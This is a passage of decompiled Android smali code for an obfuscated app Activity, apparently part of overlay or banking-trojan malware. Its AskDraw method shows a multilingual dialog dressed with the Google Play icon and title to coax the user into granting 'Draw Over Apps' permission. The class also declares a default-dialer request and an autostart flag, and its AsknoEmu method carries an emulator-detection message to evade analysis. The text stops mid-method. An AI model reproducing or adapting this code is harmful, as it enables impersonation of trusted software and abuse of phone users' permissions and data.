.class public Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;
.super Landroid/app/Activity;
.source "snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$MyWebViewClient;,
        Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$MyChrome;
    }
.end annotation


# static fields
.field private static final FILECHOOSER_RESULTCODE:I = 0x1

.field private static final REQUEST_SET_DEFAULT_DIALER:I = 0x65

.field public static forautostart:Z


# instance fields
.field private Oklistner:Landroid/view/View$OnClickListener;

.field private mUploadMessage:Landroid/webkit/ValueCallback;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Landroid/webkit/ValueCallback<",
            "[",
            "Landroid/net/Uri;",
            ">;"
        }
    .end annotation
.end field

.field mWebView:Landroid/webkit/WebView;

.field private out:Landroid/view/View$OnClickListener;

.field value:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 59
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 297
    new-instance v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$4;

    invoke-direct {v0, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$4;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;)V

    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->out:Landroid/view/View$OnClickListener;

    .line 313
    new-instance v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$5;

    invoke-direct {v0, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$5;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;)V

    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->Oklistner:Landroid/view/View$OnClickListener;

    const-string v0, ""

    .line 331
    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->value:Ljava/lang/String;

    return-void
.end method

.method private AskDraw()V
    .locals 9

    .line 141
    new-instance v0, Landroid/app/AlertDialog$Builder;

    new-instance v1, Landroid/view/ContextThemeWrapper;

    const/high16 v2, 0x7f0b0000

    invoke-direct {v1, p0, v2}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V

    invoke-direct {v0, v1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 146
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    .line 147
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/16 v3, 0xc31

    const/4 v4, 0x3

    const/4 v5, 0x2

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-eq v2, v3, :cond_3

    const/16 v3, 0xca9

    if-eq v2, v3, :cond_2

    const/16 v3, 0xe7e

    if-eq v2, v3, :cond_1

    const/16 v3, 0xf2e

    if-eq v2, v3, :cond_0

    goto :goto_0

    :cond_0
    const-string v2, "zh"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x2

    goto :goto_1

    :cond_1
    const-string v2, "tr"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x3

    goto :goto_1

    :cond_2
    const-string v2, "en"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x0

    goto :goto_1

    :cond_3
    const-string v2, "ar"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x1

    goto :goto_1

    :cond_4
    :goto_0
    const/4 v1, -0x1

    :goto_1
    const-string v2, "Enable Draw Over Apps For: "

    const-string v3, "Cancel"

    const v8, 0x7f0a001c

    if-eqz v1, :cond_8

    if-eq v1, v7, :cond_7

    if-eq v1, v5, :cond_6

    if-eq v1, v4, :cond_5

    .line 171
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "OK"

    goto :goto_2

    .line 166
    :cond_5
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "di\u011fer uygulamalar \u00fczerinde \u00e7izimi etkinle\u015ftir:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "Tamam"

    const-string v3, "iptal"

    goto :goto_2

    .line 161
    :cond_6
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u8bf7\u542f\u7528\uff0c\u663e\u793a\u5728\u5e94\u7528\u7a0b\u5e8f:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u4f7f\u80fd\u591f"

    const-string v3, "\u53d6\u6d88"

    goto :goto_2

    .line 156
    :cond_7
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u062a\u0645\u0643\u064a\u0646 \u060c \u0627\u0644\u0625\u0638\u0647\u0627\u0631 \u0641\u0648\u0642 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a \u0644\u0640: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u062a\u0641\u0639\u064a\u0644"

    const-string v3, "\u0625\u0644\u063a\u0627\u0621"

    goto :goto_2

    .line 151
    :cond_8
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v8}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "Enable"

    .line 176
    :goto_2
    :try_start_0
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->appContext:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v4, "com.android.vending"

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 177
    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const-string v2, "Google Play"

    .line 178
    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_7

    .line 183
    :catch_0
    :try_start_1
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 184
    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    .line 185
    invoke-virtual {p0, v8}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_7

    .line 187
    :catch_1
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    .line 188
    :goto_3
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    const-string v4, "ask_battary"

    const-string v5, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    if-eqz v2, :cond_a

    .line 190
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 191
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_9

    .line 193
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 194
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_3

    .line 200
    :cond_9
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_3

    .line 203
    :cond_a
    :goto_4
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_c

    .line 205
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 206
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_b

    .line 208
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 209
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_4

    .line 215
    :cond_b
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_4

    .line 218
    :cond_c
    :goto_5
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_e

    .line 220
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 221
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    .line 223
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 224
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_5

    .line 230
    :cond_d
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_5

    .line 233
    :cond_e
    :goto_6
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_10

    .line 235
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 236
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_f

    .line 238
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 239
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_6

    .line 245
    :cond_f
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_6

    .line 254
    :cond_10
    :goto_7
    new-instance v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$1;

    invoke-direct {v2, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$1;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 263
    new-instance v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$2;

    invoke-direct {v1, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$2;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;)V

    invoke-virtual {v0, v3, v1}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 270
    new-instance v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$3;

    invoke-direct {v1, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$3;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;)V

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setOnCancelListener(Landroid/content/DialogInterface$OnCancelListener;)Landroid/app/AlertDialog$Builder;

    .line 278
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void
.end method

.method private AsknoEmu()V
    .locals 8

    .line 490
    new-instance v0, Landroid/app/AlertDialog$Builder;

    new-instance v1, Landroid/view/ContextThemeWrapper;

    const/high16 v2, 0x7f0b0000

    invoke-direct {v1, p0, v2}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V

    invoke-direct {v0, v1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 493
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    .line 494
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/16 v3, 0xc31

    const/4 v4, 0x3

    const/4 v5, 0x2

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-eq v2, v3, :cond_3

    const/16 v3, 0xca9

    if-eq v2, v3, :cond_2

    const/16 v3, 0xe7e

    if-eq v2, v3, :cond_1

    const/16 v3, 0xf2e

    if-eq v2, v3, :cond_0

    goto :goto_0

    :cond_0
    const-string v2, "zh"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x2

    goto :goto_1

    :cond_1
    const-string v2, "tr"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x3

    goto :goto_1

    :cond_2
    const-string v2, "en"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x0

    goto :goto_1

    :cond_3
    const-string v2, "ar"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x1

    goto :goto_1

    :cond_4
    :goto_0
    const/4 v1, -0x1

    :goto_1
    if-eqz v1, :cond_8

    if-eq v1, v7, :cond_7

    if-eq v1, v5, :cond_6

    if-eq v1, v4, :cond_5

    const-string v1, "emulator detected.\n this app does not support emulator devices"

    .line 518
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

